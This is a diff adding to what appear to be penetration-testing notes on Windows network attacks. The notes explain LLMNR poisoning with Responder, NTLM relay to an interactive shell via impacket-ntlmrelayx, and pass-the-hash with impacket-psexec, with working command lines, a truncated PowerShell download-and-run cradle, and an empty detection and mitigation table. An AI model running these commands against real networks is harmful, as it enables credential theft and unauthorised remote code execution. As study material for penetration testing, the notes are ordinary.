@@ -47,8 +47,20 @@ impacket-ntlmrelayx -tf iptargets.txt -smb2support -c "powershell IEX(NEW-Object
 ```
 When a Windows machine fails DNS resolution, it sends out an LLMNR/WPAD broadcast to find the requested host. Responder intercepts this request and replies as the legitimate server, forcing the victim to authenticate to the attacker. The victim then sends an NTLMv2 authentication challenge-response, which can be captured and relayed using ntlmrelayx to another target, where it is accepted as valid and used for remote execution.
 
-4. SMB relay
+4. SMB relay and relay with interactive shell
+Then attack leverages LLMNR/NBT-NS poisioning to intercept authentication attempts broadcast by windows hosts failing dns resolution. Responder captures NTLMv2 challenge-response and forwards it to ntlmrelayx, which relays credentials to a target host lacking SMB signing enforcement. Since the target cannot verify authenticity of the relayed session, it accepts the credentials as legititmate, allowing an interactive shell.
 
+```
+impacket-ntlmrelayx -tf iptargets.txt -smb2support -i
+```
+5. Pass-the-hash
+Once we obtain NTLM hashes we can pass it, as the windows accepts it as valid credentials, without needing the plaian text password.
+
+```
+impacket-psexec administrator@192.168.0.72 -hashes
+```
+# Detection and mititgation
+| Technique | Detetction | Mititgation
 
 
 
